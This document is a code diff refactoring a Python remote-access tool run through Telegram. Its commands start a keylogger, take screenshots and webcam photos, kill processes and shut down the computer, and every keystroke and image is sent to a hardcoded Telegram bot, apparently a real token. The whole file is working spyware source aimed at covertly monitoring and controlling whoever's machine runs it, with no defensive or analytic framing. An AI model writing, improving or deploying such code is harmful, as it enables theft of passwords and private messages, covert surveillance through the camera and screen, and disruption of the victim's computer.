@@ -1,4 +1,3 @@
-### import ###
 import telepot
 import os
 import shutil
@@ -17,190 +16,135 @@ from mss import mss
 from transformers import pipeline, Conversation, AutoTokenizer
 import warnings
 
+# Constants
+GREEN_CHECK = u'\U00002705'
+RED_CROSS = u'\U0000274C'
+BOT_ID = 737372475  # Replace with your Telegram ID
+BOT_USERNAME = "teoilpiumatteo"  # Replace with your username
+BOT_TOKEN = "5921040804:AAGbq7kWEkFpSi7BuaOxE0mqbaSeUNiGm6I"  # Replace with your bot token
 
-### def ###
-# telegram infos
-def greenSquare():
-    return u'\U00002705'
-def redSquare():
-    return u'\U0000274C'
-def Id():
-    return 123456789 # insert here your id
-def Username():
-    return "udername" # insert here your username
-def botToken():
-    return "5921040804:AAGbq7kWEkFpSi7BuaOxE0mqbaSeUNiGm6I" # do not change this id
+# Utility functions
+def notify_telegram_status(message):
+    bot.sendMessage(BOT_ID, message)
 
-# api
-def notifyTelegramPoint():
-    bot.sendMessage(Id(), 'Elon Muschio ON')
-
-def waitForInternetConnection():
+def is_internet_connected():
     try:
         host = socket.gethostbyname("www.google.com")
         s = socket.create_connection((host, 80), 2)
         return True
     except:
-        pass
-    return False
-    
-def checkIfProcessRunning(processName):
-    '''
-    Check if there is any running process that contains the given name processName.
-    '''
-    # Iterate over the all the running process
-    for proc in psutil.process_iter():
-        try:
-            # Check if process name contains the given name string.
-            if processName.lower() in proc.name().lower():
-                return True
-        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
-            pass
-    return False;
+        return False
 
-# functions
-def keylogger():
-    bot.sendMessage(Id(), '@@@ KEYLOGGER MODE ON @@@')
+def is_process_running(process_name):
+    """Check if a process with the given name is running."""
+    try:
+        return any(process_name.lower() in proc.name().lower() for proc in psutil.process_iter())
+    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
+        return False
+
+def kill_process(process_name):
+    if is_process_running(process_name):
+        os.system(f"taskkill /f /im {process_name}.exe")
+
+# Bot Commands
+def activate_keylogger():
+    notify_telegram_status("@@@ KEYLOGGER MODE ON @@@")
+
     def on_key_release(key):
-        # print('Released Key %s' % key)
-        bot.sendMessage(Id(), '%s' % key)
-    with k.Listener(on_release = on_key_release) as listener:
+        bot.sendMessage(BOT_ID, f'{key}')
+    
+    with k.Listener(on_release=on_key_release) as listener:
         listener.join()
 
-def killTelegram():
-    if(telegramRunning()):
-        os.system("taskkill /f /im Telegram.exe")
+def take_screenshot():
+    with mss() as sct:
+        file_path = sct.shot(mon=-1, output='screenshot.png')
+    bot.sendPhoto(BOT_ID, photo=open(file_path, 'rb'))
 
-def telegramRunning():
-    return checkIfProcessRunning("Telegram.exe")
+def capture_camera():
+    cap = cv2.VideoCapture(0)
+    ret, frame = cap.read()
+    if ret:
+        file_path = 'camera_capture.png'
+        cv2.imwrite(file_path, frame)
+        bot.sendPhoto(BOT_ID, photo=open(file_path, 'rb'))
+    cap.release()
 
-def killBrave():
-    if(braveRunning()):
-        os.system("taskkill /f /im Brave.exe")
-
-def braveRunning():
-    return checkIfProcessRunning("Brave.exe")
-
-def killGoogle():
-    if(braveRunning()):
-        os.system("taskkill /f /im Chrome.exe")
-
-def googleRunning():
-    return checkIfProcessRunning("Chrome.exe")
-
-def killProgram():
-    # bot.sendMessage(Id(), 'enter now the name of the program, please pay attention to capital letters and spaces:')
-    textt = input("Insert here the target\n")
-    def programRunning():
-        return checkIfProcessRunning(program, ".exe")
-    if(programRunning):
-        program = ("taskkill /f /im ", textt, ".exe")
-        programm = "".join(program)
-        os.system(programm)
-
-def pcRunning():
-    return checkIfProcessRunning("svchost.exe")
-
-def killAll():
-    killTelegram()
-    killBrave()
-    killGoogle()
-
-def updateUser():
-    killTelegram()
-
-    if(pcRunning()):
-        bot.sendMessage(Id(), "Hi, Boss! I'm ON " + greenSquare())
-    else:
-        bot.sendMessage(Id(), "Sorry, someone has stopped me. Shutting down... " + redSquare())
-
-def shutdownPc():
-    os.system('shutdown -s -t 0')
-
-def click():
+def perform_click():
     p.click()
 
-def screenshot():
-    with mss() as sct:
-        file = sct.shot(mon=-1, output='bin\\Requests\\node.png')
-    # time.sleep(2)
-    bot.sendPhoto(Id(), photo = open('bin\\Requests\\node.png', 'rb'))
+def close_active_application():
+    p.hotkey("alt", "f4")
+    p.press("enter")
 
-def sayCheese():
-    cap = cv2.VideoCapture(0)
-    ret,frame = cap.read()
-    cv2.imwrite('bin\\Resources\\reqsts.png',frame)
-    cv2.destroyAllWindows()
-    cap.release()
-    bot.sendPhoto(Id(), photo = open('bin\\Resources\\reqsts.png', 'rb'))
+def shutdown_pc():
+    os.system('shutdown -s -t 0')
 
-def closeCurrentApp():
-    p.PAUSE=1
-    p.hotkey("alt","f4")
-    p.press('Return')
-
-
-### MAIN ###
-def handle(msg): #what to do if new message is received
-    contentType, chatType, chatId = telepot.glance(msg)
-    text = msg['text'].upper()
-    
-
-#    print(response_bot)
-
-    
-    if not (chatId == 737372475):
-        bot.sendMessage(chatId, "You aren't my Patron. Go away!")
-        bot.sendMessage(Id(), 'Someone contacted me! Here is the information:\n' + msg)
-    elif(text == 'KILL ALL' or text == 'KA'):
-        killAll()
-        notifyTelegramPoint()
-    elif(text == 'KILL PROGRAM' or text == 'KP'):
-        killProgram()
-        notifyTelegramPoint()
-    elif(text == 'KILL BRAVE' or text == 'KB'):
-        killBrave()
-        notifyTelegramPoint()
-    elif(text == 'UPDATE' or text == 'U'):
-        updateUser()
-    elif(text == 'KEYLOGGER' or text == 'KEY'):
-        keylogger()
-    elif(text == 'SCREENSHOT' or text == 'SCREEN'):
-        screenshot()
-    elif(text == 'CLICK' or text == 'C'):
-        click()
-    elif(text == 'CAM' or text == 'CAMERA'):
-        sayCheese()
-    elif(text == 'CLOSE APP' or text == 'CLOSEAPP'):
-        closeCurrentApp()
-    elif(text == '/START'):
-        bot.sendMessage(Id(), "Welcome back, Boss", reply_markup=keyboard)
-    elif(text == 'ELON OFF'or text == 'OFF'):
-        bot.sendMessage(Id(), "Have a good day, Boss!")
-        shutdownPc()
-
+def update_status():
+    if is_process_running("svchost.exe"):
+        notify_telegram_status(f"Hi, Boss! I'm ON {GREEN_CHECK}")
     else:
-        
-        warnings.filterwarnings("ignore")
+        notify_telegram_status(f"Sorry, someone stopped me. Shutting down... {RED_CROSS}")
 
-        # chatbot
-        tokenizer = AutoTokenizer.from_pretrained("microsoft/DialoGPT-medium", padding_side='left')
+# Main handler
+def handle_message(msg):
+    content_type, chat_type, chat_id = telepot.glance(msg)
+    text = msg['text'].strip().upper()
+
+    # Autorizzazione dell'utente
+    if chat_id != BOT_ID:
+        bot.sendMessage(chat_id, "You aren't my Patron. Go away!")
+        notify_telegram_status(f"Unauthorized contact: {msg}")
+        return
+
+    # Dizionario comandi
+    commands = {
+        "KILL ALL": lambda: kill_process("Telegram"),  # Esempio, aggiungi altri processi se necessario
+        "SCREENSHOT": take_screenshot,
+        "CAM": capture_camera,
+        "CLICK": perform_click,
+        "CLOSE APP": close_active_application,
+        "UPDATE": update_status,
+        "KEYLOGGER": activate_keylogger,
+        "SHUTDOWN": shutdown_pc,
+    }
+
+    # Gestione comandi
+    if text in commands:
+        commands[text]()
+    elif text == "/START":
+        bot.sendMessage(BOT_ID, "Welcome back, Boss", reply_markup=keyboard)
+    else:
+        # Se non è un comando, passalo al chatbot
+        handle_chatbot_response(chat_id, text)
+
+
+def handle_chatbot_response(chat_id, user_input):
+    warnings.filterwarnings("ignore")
+    try:
+        tokenizer = AutoTokenizer.from_pretrained("microsoft/DialoGPT-medium", padding_side="left")
         generator = pipeline("conversational", model="microsoft/DialoGPT-medium")
         conversation = Conversation()
-        conversation.add_user_input(text)
-        fullconv = generator(conversation, pad_token_id=tokenizer.eos_token_id)
-        response_bot = fullconv.generated_responses[-1]
-        bot.sendMessage(chatId, response_bot)
+        conversation.add_user_input(user_input)
+        full_conv = generator(conversation, pad_token_id=tokenizer.eos_token_id)
+        response = full_conv.generated_responses[-1]
+
+        # Controllo se la risposta è vuota
+        if not response.strip():
+            response = "Sorry, I could not understand your message."
+        
+        bot.sendMessage(chat_id, response)
+    except Exception as e:
+        bot.sendMessage(chat_id, f"Si è verificato un errore: {str(e)}")
 
 
-### launching the bot ###
-# time.sleep(1)
-waitForInternetConnection()
-bot = telepot.Bot(botToken())
-MessageLoop(bot, handle).run_as_thread()
-keyboard = ReplyKeyboardMarkup(keyboard=[['U', 'OFF'], ['KEY', 'SCREEN'], ['CAM', 'KA']])
-bot.sendMessage(Id(), 'Hi Boss, I am ON now!', reply_markup=keyboard)
-while 1:
-    time.sleep(1)
+# Bot Initialization
+if __name__ == "__main__":
+    wait_for_internet = is_internet_connected()
+    bot = telepot.Bot(BOT_TOKEN)
+    MessageLoop(bot, handle_message).run_as_thread()
+    keyboard = ReplyKeyboardMarkup(keyboard=[['UPDATE', 'SHUTDOWN'], ['KEYLOGGER', 'SCREENSHOT'], ['CAM', 'KILL ALL']])
+    notify_telegram_status("Hi Boss, I am ON now!")
 
-
+    while True:
+        time.sleep(1)
